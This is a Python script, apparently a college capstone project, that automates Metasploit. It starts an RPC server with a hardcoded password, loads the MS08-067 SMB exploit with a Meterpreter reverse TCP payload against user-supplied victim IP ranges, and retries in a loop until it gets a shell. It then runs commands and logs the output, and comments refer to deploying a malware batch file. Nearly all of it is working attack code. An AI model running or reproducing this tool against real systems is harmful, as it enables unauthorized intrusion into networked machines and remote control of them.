import sys
import time
import os
import json
from pymetasploit3.msfrpc import MsfRpcClient
from pymetasploit3.msfrpc import SessionManager
from pymetasploit3.msfconsole import *

## Written by Steven Brohl and Nick Vaillancourt
## 06/08/2020 -- Walsh College Capstone Project
## Automated Metasploit Module
## Note:
##      You must be running Kali or Parrot Linux OS to continue!!!
##      You must install up.rc under /usr/share/metasploit-framework/scripts/resource
##      You must install red.rb under /usr/share/metasploit-framework/scripts/ruby
##      You must place chickenlittle.bat in the same directory as metasploit.py or under ~/Desktop
##      Failure to follow these instructions may cause unknown issues that have not been troubleshooted by the authors
##      UPDATED -- 06/18/2020

class Metasploit():

    ''' 
        A class for executing automated metasploit attacks:
        Inserts - User inputted IP address range to attack (Victim) / User inputted IP address for host device (Attacker)
        Returns - None
    '''

    def __init__(self, rhost="", lhost="", port=""):

        ''' This is the contstructor used to instantiate all external variables being passed into the Metasploit class. '''

        self.rhost = rhost
        self.lhost = lhost
        self.port = port


    def launchAttack(self):

        ''' This method is responsible for launching the Metasploit attack using the predefined exploit/payload against user defined target(s) ''' 

        print("\nAttempting to Exploit target(s)...\n")
        self.exploit.execute(payload=self.payload)

        try:
            session_id = list(self.client.sessions.list)[0]

            ## If there is an Index Error then a connection has not been established
            shell = self.client.sessions.session(session_id)
            
            if shell:
                print("\n### ATTACK SUCCESSFUL! ###\n")
                ## Run meterpreter resource script to execute exploit and deploy malware (chickenlittle.bat)
                #shell.write("run /usr/share/metasploit-framework/scripts/resource/up.rc")
                shell.write("ipconfig")
                
                ## Read the Shell in the *nix terminal
                print(shell.read())

                with open("attack_log.txt" , "a+") as log:
                    log.write(shell.read())
                    log.close()

                time.sleep(2)

                #shell.write("exit")
                
                return True

        except IndexError:
            print("Remote Connection not established or attack failed... Attempting attack again")
            return True

    def launchMsfpcd(self):

        ''' This method is used to start msfpcd which begins a remote instance of Metasploit ''' 

        ## Initialize the Metasploit framework remote server
        print("\nLoading Metasploit Framework Remote Server...\n")

        ## >/dev/null 2>&1 tells the *nix termninal to pipe all output to null. This prevents any text output on screen for the boot-up sequence for msfrpcd
        os.system("msfrpcd -P 1337haxx0r >/dev/null 2>&1")

        ## Wait 3 seconds after launchin the remote metasploit server before trying to connect
        time.sleep(3)


    def loadAttack(self):

        ''' This method is used to load the exploit and payload used to breach vulnerable devices '''

        print("\nLoading exploit...\n")
        self.exploit = self.client.modules.use('exploit', 'windows/smb/ms08_067_netapi') ## Description of Windows XP Explpoit -- https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi

        print("\nLoading payload...\n")
        self.payload = self.client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
        

    def loginMsfpcd(self):

        ''' This method is used to login to the Metasploit remote procedure call daemon (msfpcd) instance created by launchMsfpcd '''

        ## Starting the client connection to connect to the metasploit remote server
        print("\nLogging in...\n")
        self.client = MsfRpcClient('1337haxx0r', ssl=True)
 

    def loadOptions(self):

        ''' 
            This method is used for loading all other Metasploit options to carry out attacks:
            Note: These options may vary if the exploit and payload are changed under the loadAttack method
        
        '''

        print("\nRemote Host IP (VICTIM) - " + str(self.rhost) + "\n")
        self.exploit['RHOSTS'] = self.rhost

        print("\nLocal Host IP (ATTACKER) - " + str(self.lhost) + "\n")
        self.payload['LHOST'] = self.lhost
        
        print("\nLocal Host Port - " + str(self.port) + "\n")
        self.payload['LPORT'] = self.port


m = Metasploit()

## launching Metasploit framework RPC server
m.launchMsfpcd()

## Logging *nix device into the Metasploit RPC server
m.loginMsfpcd()

## Gathering preliminary information on the host device for easier attack automation
m.lhost =  input("What is the IP Address for the Local Host (Attacker): ")
m.port =  input("Specify the Local Host port being used for remote connection: ")
m.rhost = input("What is the IP address/range (e.x: 192.168.0.1/24) of the Remote Host (Victim(s)): ")

## Setting Attack options

## Loading Attack (Exploit / Payload) options
m.loadAttack()

## Loading Attack options (lhost / rhost / port)
m.loadOptions()


program_run = True

try:
    ## Starting main program which loads exploit, payload, and launches attack/uploads malware
    while program_run:

        ## Preparing to Attack
        program_run = m.launchAttack()

## Stop the program quietly using Ctrl - C
except KeyboardInterrupt:
    sys.exit(0)